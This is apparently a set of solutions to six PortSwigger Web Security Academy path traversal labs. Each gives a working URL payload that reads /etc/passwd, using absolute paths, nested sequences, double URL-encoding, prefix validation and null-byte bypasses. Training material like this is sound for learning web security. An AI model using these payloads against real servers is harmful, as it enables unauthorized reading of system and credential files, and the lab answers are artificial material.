# 01. File path traversal, simple case
[Link...](https://portswigger.net/web-security/file-path-traversal/lab-simple)
## Solution
`https://aca21fe01e7e5ce9c052bb0e007d00c4.web-security-academy.net/image?filename=../../../etc/passwd`

# 02. File path traversal, traversal sequences blocked with absolute path bypass
[Link...](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
## Solution
The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory:
`https://acc31fe31eb9229dc0fe134200be0008.web-security-academy.net/image?filename=/etc/passwd`

# 03. File path traversal, traversal sequences stripped non-recursively
[Link...](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
## Solution
The application strips path traversal sequences from the user-supplied filename before using it:
`https://acb41feb1f41594dc01d4bf6000a0096.web-security-academy.net/image?filename=....//....//....//etc/passwd` 

OR 

`https://acb41feb1f41594dc01d4bf6000a0096.web-security-academy.net/image?filename=..././..././..././etc/passwd`

# 04. File path traversal, traversal sequences stripped with superfluous URL-decode
[Link...](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
## Solution
The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.
`https://accd1f611ff1738fc0de4df100450016.web-security-academy.net/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`

# 05. File path traversal, validation of start of path
[Link...](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
## Solution
The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.
`https://acc01f791e1b1386c0b7cf9600570084.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd`

# 06. File path traversal, validation of file extension with null byte bypass
[Link...](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
## Solution
The application validates that the supplied filename ends with the expected file extension.
`https://ac451fcd1ed978b4c0735e8800d40032.web-security-academy.net/image?filename=../../../etc/passwd%00.jpg`
